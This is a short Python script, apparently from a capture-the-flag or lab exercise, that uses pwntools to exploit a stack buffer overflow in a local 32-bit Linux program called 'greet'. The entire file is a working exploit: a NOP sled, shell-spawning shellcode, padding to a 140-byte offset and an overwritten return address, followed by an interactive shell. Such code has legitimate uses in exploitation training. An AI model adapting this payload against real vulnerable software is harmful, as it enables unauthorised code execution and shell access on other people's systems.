from pwn import *
"""
    Padding = 140 
    Exploit
    [ nop x 50 ][shellcode x 44][padding x (140-50-44)][ saved_eip ]
"""
context.update(arch='i386', os='linux')
shellcode = asm(shellcraft.i386.linux.sh())
#print len(shellcode) len = 44
nopsled = '\x90'*50
padding = "A"*(140 - len(shellcode) - len(nopsled))
eip = p32(0xffffd660+30)
exploit = nopsled + shellcode + padding + eip
proc = process('./greet')
proc.sendline(exploit)
proc.interactive()
